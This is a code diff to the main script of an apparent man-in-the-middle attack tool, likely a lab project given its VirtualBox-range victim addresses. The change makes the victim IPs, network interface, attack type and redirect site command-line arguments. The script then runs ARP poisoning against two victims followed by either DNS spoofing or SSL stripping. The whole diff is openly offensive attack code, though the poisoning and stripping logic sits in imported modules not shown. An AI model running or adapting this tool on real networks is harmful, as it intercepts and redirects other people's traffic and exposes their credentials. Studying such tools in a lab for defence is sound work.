@@ -1,4 +1,5 @@
 import time
+import sys
 
 from arppoisoning import ArpPoisoning
 from getmacipattacker import GetIpMac
@@ -8,16 +9,29 @@ from sslstripping import SimpleSslStrip
 
 #victim1
 #macWindows = "08:00:27:b7:c4:af"
-ip_victim_1 = "192.168.56.3"
+global ip_victim_1 #= "192.168.56.3"
 
 #victim2
 #macServer = "08:00:27:cc:08:6f"
-ip_victim_2 = "192.168.56.103"
+global ip_victim_2 # =  "192.168.56.103"
 
-interface = "enp0s8"
+global interface #= "enp0s8"
 
 global mac_attacker
 global ip_attacker
+global type_of_attack
+global redirect_website
+
+if len(sys.argv) != 6:
+    print("Invalid number of arguments. Uasge: python3 main.py ip_victim_1 ip_victim_2 interface type_of_attack "
+          "redirect_website")
+else:
+    ip_victim_1 = sys.argv[1]
+    ip_victim_2 = sys.argv[2]
+    interface = sys.argv[3]
+    type_of_attack = sys.argv[4]
+    redirect_website = sys.argv[5]
+
 
 if __name__ == "__main__":
     get_ip_mac_module = GetIpMac(interface)
@@ -28,13 +42,12 @@ if __name__ == "__main__":
     arp_poisoning_module = ArpPoisoning(ip_victim_1, ip_victim_2, mac_attacker, ip_attacker, interface)
     arp_poisoning_module.execute_poisoning()
 
-    # dns_spoof_module = DnsSpoofing("192.168.56.102")
-    # dns_spoof_module.execute_poisoning()
+    if(type_of_attack == "dns"):
+        dns_spoof_module = DnsSpoofing(redirect_website)
+        dns_spoof_module.execute_poisoning()
+    else:
+        ssl_strip_module = SimpleSslStrip(redirect_website)
+        ssl_strip_module.execute_stripping()
 
-    ssl_strip_module = SimpleSslStrip("192.168.56.102")
-    ssl_strip_module.execute_stripping()
-
-    # dns_poisoning_module = DnsPoisoning(mac_attacker, ip_attacker, "192.168.56.102")
-    # dns_poisoning_module.execute_poisoning()
 
 
